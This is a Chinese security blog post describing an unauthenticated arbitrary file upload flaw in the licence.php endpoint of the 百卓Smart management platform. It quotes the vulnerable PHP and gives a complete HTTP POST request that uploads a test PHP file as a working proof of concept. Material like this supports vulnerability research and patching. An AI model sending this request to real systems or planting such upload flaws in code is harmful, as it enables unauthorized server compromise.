---
title: "百卓Smart管理平台 licence.php 文件上传漏洞"
source: https://mrxn.net/jswz/baizhuosmart-licence-rce.html
asset_dir: assets/百卓smart管理平台-licence.php-文件上传漏洞
---

# 百卓Smart管理平台 licence.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/18 08:20
* 1116浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

服务器

身份验证

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 licence.php 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "文件上传")漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")上传恶意后门文件，执行任意指令，从而获得服务器权限并操纵服务器文件。

漏洞修复方案

# 漏洞分析

关键代码如下

```
<?php
if(isset($_POST['mode'])) $mode=$_POST['mode'];
if($mode=="set")
{
    $type=$_POST['ck'];
    if($type == "radhttp") //http
    {
        chdir("/home/");
        if(!is_file("upload")) mkdir("upload",0777);
        $http_licence_dir = "/home/upload/";
        chdir($http_licence_dir);
        exec("rm -rf *");
        $upload_file = $_FILES['file_upload']['tmp_name'];
        $upload_file_name = $_FILES['file_upload']['name'];
        /*echo $upload_file."<br>";
        echo $upload_file_name."<br>";*/

        if(!copy($upload_file,$http_licence_dir.$upload_file_name))
        {
            add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");
            alert("$LANG_UPLOADLICENCE_FAILD","licence.php");
            exit();

        }
        $str = "upgrade licence $http_licence_dir$upload_file_name\n";
        $rbuf = socket($str);
        if(!strstr($rbuf,"0:"))
        {
            add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_FAILD");
            alert("$LANG_UPDATELICENCE_FAILD","licence.php");
            exit();

        }
        add_optlog($sess_username,"licence",GetIp(),"$LANG_HTTPLICENCE_SUCCESS");
        alert("$LANG_UPDATELICENCE_SUCCESS","licence.php");

    }
```

深入探索

恶意软件分析工具

网络安全课程

安全工具开发

如果 `$mode=="set"`，且 `$type == "radhttp"`，则在 home 目录下创建 upload目录（如果不存在），设置权限并清空upload目录后，直接保存上传文件到此目录。

安全研究工具

# 漏洞复现

```
POST /sysmanage/licence.php HTTP/1.1
Host: smart.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="mode"

set
------123456
Content-Disposition: form-data; name="ck"

radhttp
------123456
Content-Disposition: form-data; name="file_upload"; filename="test.php"

<?=md5(123456);unlink(__FILE__);
------123456--
```

[[![百卓Smart管理平台 licence.php 文件上传漏洞](images/img-001-20c4e4532fcb.png)](https://mrxn.net/content/uploadfile/202501/89771737119255.png)](https://mrxn.net/content/uploadfile/202501/89771737119255.png)

访问[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "上传文件") /home/upload/test.php

网络安全

[[![百卓Smart管理平台 licence.php 文件上传漏洞](images/img-002-e6dfdc74bc06.png)](https://mrxn.net/content/uploadfile/202501/86d01737119274.png)](https://mrxn.net/content/uploadfile/202501/86d01737119274.png)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.漏洞分析](#toc-2-)
* [3.漏洞复现](#toc-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[百卓Smart管理平台 licence.php 文件上传漏洞](https://mrxn.net/jswz/baizhuosmart-licence-rce.html)  
文章链接：<https://mrxn.net/jswz/baizhuosmart-licence-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-licence-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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